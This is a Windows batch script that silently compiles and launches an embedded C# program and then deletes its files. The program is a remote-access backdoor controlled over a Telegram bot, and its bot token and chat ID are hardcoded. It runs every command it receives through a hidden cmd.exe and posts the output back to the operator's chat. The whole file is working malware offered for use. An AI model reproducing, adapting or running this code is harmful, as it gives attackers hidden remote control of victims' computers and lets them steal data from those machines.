@echo off
:: C# Auto-Compiler & Silent Executor for Windows
set "CSC=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC%" set "CSC=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"

set "SRC=%TEMP%\Shellndrod_%RANDOM%.cs"
set "EXE=%TEMP%\Shellndrod_%RANDOM%.exe"

:: استخراج كود C# وحفظه في ملف مؤقت
more +18 "%~f0" > "%SRC%"

:: تجميع كود C# إلى ملف تنفيذي يعمل في الخلفية بدون نافذة console
"%CSC%" /nologo /target:winexe /out:"%EXE%" /r:System.dll /r:System.Net.Http.dll "%SRC%" >nul 2>&1

:: تشغيل البرنامج في الخلفية فوراً ثم حذف الملفات المؤقتة
if exist "%EXE%" (
    start "" /b "%EXE%"
    timeout /t 2 >nul
    del /f /q "%SRC%" "%EXE%" >nul 2>&1
)
exit /b

/* ==================== C# SOURCE CODE ==================== */
using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Shellndrod
{
    class Program
    {
        private static readonly string TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0";
        private static readonly string CHAT_ID = "8897834377";
        private static readonly string BASE_URL = "https://api.telegram.org/bot" + TOKEN;
        private static readonly HttpClient client = new HttpClient();
        private static long offset = 0;

        static void Main(string[] args)
        {
            client.Timeout = TimeSpan.FromSeconds(40);
            SendTelegram("[+] العميل (Windows C# Native) متصل وجاهز تلقائياً").Wait();

            while (true)
            {
                try
                {
                    PollUpdates().Wait();
                }
                catch
                {
                    Thread.Sleep(5000);
                }
            }
        }

        private static async Task SendTelegram(string text)
        {
            if (string.IsNullOrEmpty(text)) text = "[لا يوجد مخرجات]";

            for (int i = 0; i < text.Length; i += 3900)
            {
                int maxLength = Math.Min(3900, text.Length - i);
                string chunk = text.Substring(i, maxLength);

                var values = new System.Collections.Generic.Dictionary<string, string>
                {
                    { "chat_id", CHAT_ID },
                    { "text", chunk }
                };

                var content = new FormUrlEncodedContent(values);
                try
                {
                    await client.PostAsync(BASE_URL + "/sendMessage", content);
                }
                catch { }
            }
        }

        private static async Task PollUpdates()
        {
            string url = $"{BASE_URL}/getUpdates?offset={offset + 1}&timeout=30";
            var response = await client.GetStringAsync(url);

            if (response.Contains("\"ok\":true"))
            {
                // استخراج بسيط لبيانات الرسائل
                int updateIdx = response.IndexOf("\"update_id\":");
                while (updateIdx != -1)
                {
                    int endIdx = response.IndexOf(",", updateIdx);
                    if (endIdx != -1)
                    {
                        string idStr = response.Substring(updateIdx + 12, endIdx - (updateIdx + 12));
                        if (long.TryParse(idStr, out long parsedId))
                        {
                            offset = Math.Max(offset, parsedId);
                        }
                    }

                    int textIdx = response.IndexOf("\"text\":\"", updateIdx);
                    if (textIdx != -1)
                    {
                        int textEnd = response.IndexOf("\"", textIdx + 8);
                        if (textEnd != -1)
                        {
                            string cmd = response.Substring(textIdx + 8, textEnd - (textIdx + 8));
                            cmd = System.Text.RegularExpressions.Regex.Unescape(cmd);

                            if (cmd == "/exit")
                            {
                                await SendTelegram("[+] تم إغلاق العميل");
                                Environment.Exit(0);
                            }

                            if (!string.IsNullOrWhiteSpace(cmd))
                            {
                                string output = RunCmd(cmd);
                                await SendTelegram(output);
                            }
                        }
                    }

                    updateIdx = response.IndexOf("\"update_id\":", updateIdx + 1);
                }
            }
        }

        private static string RunCmd(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.GetEncoding(866) // دعم الترميز العربي والرموز
                };

                using (Process proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(60000);

                    string result = output + error;
                    return string.IsNullOrWhiteSpace(result) ? "[تم التنفيذ بدون مخرجات]" : result;
                }
            }
            catch (Exception ex)
            {
                return "[!] خطأ: " + ex.Message;
            }
        }
    }
}
